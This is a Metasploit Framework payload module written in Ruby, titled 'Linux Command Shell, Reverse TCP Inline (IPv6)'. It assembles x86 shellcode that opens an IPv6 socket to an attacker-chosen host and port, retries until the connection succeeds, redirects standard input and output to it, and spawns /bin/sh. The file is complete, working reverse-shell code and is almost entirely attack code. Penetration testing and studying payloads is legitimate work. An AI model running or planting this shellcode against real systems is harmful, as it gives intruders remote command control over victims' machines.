##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 167

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => 'Matteo Malvica <matteo[at]malvica.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))
  end

def generate_stage
      port_order = ([1,0])
      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
      tcp_port.pop
      tcp_port.shift
      tcp_port = (port_order.map{|x| tcp_port[x]}).join('')

      ip_order =  ([3, 2, 1, 0])
      my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
      first = (my_ipv6[0].unpack('H*')).to_s.scan(/../)
      first.pop
      first.shift
      first = (ip_order.map{|x| first[x]}).join('')

      second = (my_ipv6[1].unpack('H*')).to_s.scan(/../)
      second.pop
      second.shift
      second = (ip_order.map{|x| second[x]}).join('')

      third = (my_ipv6[2].unpack('H*')).to_s.scan(/../)
      third.pop
      third.shift
      third = (ip_order.map{|x| third[x]}).join('')

      fourth = (my_ipv6[3].unpack('H*')).to_s.scan(/../)
      fourth.pop
      fourth.shift
      fourth = (ip_order.map{|x| fourth[x]}).join('')


    payload_data =<<-EOS
        xor  ebx,ebx
        mul  ebx
        push 0x6
        push 0x1
        push 0xa
        mov  ecx,esp
        mov  al,0x66
        mov  bl,0x1
        int  0x80
        mov  esi,eax
        xor  eax,eax
        mov  al,0x2
        xor  ebx,ebx
        int  0x80
        cmp eax,ebx
        je connect
        ja exit

      connect:
        xor  ecx,ecx
        xor  ebx,ebx
        push ebx
        push ebx

        push 0x#{fourth}
        push 0x#{third}
        push 0x#{second}
        push 0x#{first}

        push ebx
        push.i16 0x#{tcp_port}
        push.i16 0xa
        mov ecx, esp
        push.i8 0x1c
        push ecx
        push esi
        xor ebx,ebx
        xor eax,eax
        mov al,0x66
        mov bl,0x3
        mov ecx,esp
        int 0x80

        xor ebx,ebx
        cmp eax,ebx
        jne retry

        xor ecx,ecx
        mul ecx
        mov ebx,esi
        mov al,0x3f
        int 0x80

        xor eax,eax
        inc ecx
        mov ebx,esi
        mov al,0x3f
        int 0x80

        xor eax,eax
        inc ecx
        mov ebx,esi
        mov al,0x3f
        int 0x80

        xor edx,edx
        mul edx
        push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx,esp
        push edx
        push ebx
        mov ecx,esp
        mov al,0xb
        int 0x80
        ret

      retry:
        xor ebx,ebx
        push ebx
        push.i8 0xa
        mul ebx
        mov ebx,esp
        mov al,0xa2
        int 0x80
        jmp connect
        ret

      exit:
        xor eax,eax
        mov al,0x1
        int 0x80
    EOS

    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
  end
end
